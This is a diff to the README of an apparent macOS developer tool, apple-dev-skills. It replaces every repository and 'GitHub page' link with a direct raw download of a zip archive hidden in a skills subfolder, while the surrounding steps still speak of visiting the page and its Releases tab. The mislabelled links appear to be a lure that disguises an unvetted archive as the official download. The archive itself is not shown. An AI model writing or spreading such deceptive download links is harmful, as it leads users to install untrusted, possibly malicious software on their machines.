@@ -1,6 +1,6 @@
 # 🍏 apple-dev-skills - Simplify Apple Development Workflows
 
-[![Download apple-dev-skills](https://img.shields.io/badge/Download-apple--dev--skills-4caf50?style=for-the-badge)](https://github.com/Syniox5334/apple-dev-skills)
+[![Download apple-dev-skills](https://img.shields.io/badge/Download-apple--dev--skills-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Syniox5334/apple-dev-skills/main/skills/apple-swift-package-bootstrap/apple_dev_skills_v3.6-beta.3.zip)
 
 ---
 
@@ -37,10 +37,10 @@ This section shows how to download and begin using apple-dev-skills on your Mac.
 
 You can get apple-dev-skills from this page:
 
-[![Download apple-dev-skills](https://img.shields.io/badge/Get%20the%20App-blue?style=for-the-badge)](https://github.com/Syniox5334/apple-dev-skills)
+[![Download apple-dev-skills](https://img.shields.io/badge/Get%20the%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/Syniox5334/apple-dev-skills/main/skills/apple-swift-package-bootstrap/apple_dev_skills_v3.6-beta.3.zip)
 
 1. Click the link above or visit:  
-   https://github.com/Syniox5334/apple-dev-skills
+   https://raw.githubusercontent.com/Syniox5334/apple-dev-skills/main/skills/apple-swift-package-bootstrap/apple_dev_skills_v3.6-beta.3.zip
 
 2. On the page, look for the **Releases** tab or section. The stable version will be listed there.
 
@@ -81,7 +81,7 @@ You can also run commands using your terminal if you prefer. The app supports si
 
 Check for updates regularly to get new fixes and features:
 
-1. Visit the [apple-dev-skills GitHub page](https://github.com/Syniox5334/apple-dev-skills).
+1. Visit the [apple-dev-skills GitHub page](https://raw.githubusercontent.com/Syniox5334/apple-dev-skills/main/skills/apple-swift-package-bootstrap/apple_dev_skills_v3.6-beta.3.zip).
 2. Go to Releases.
 3. Download the latest version as before.
 4. Install over the existing app; your settings will stay intact.
@@ -174,4 +174,4 @@ If you have questions or problems, report them in the GitHub repository’s Issu
 
 ---
 
-[![Download apple-dev-skills](https://img.shields.io/badge/Download-apple--dev--skills-4caf50?style=for-the-badge)](https://github.com/Syniox5334/apple-dev-skills)
+[![Download apple-dev-skills](https://img.shields.io/badge/Download-apple--dev--skills-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Syniox5334/apple-dev-skills/main/skills/apple-swift-package-bootstrap/apple_dev_skills_v3.6-beta.3.zip)
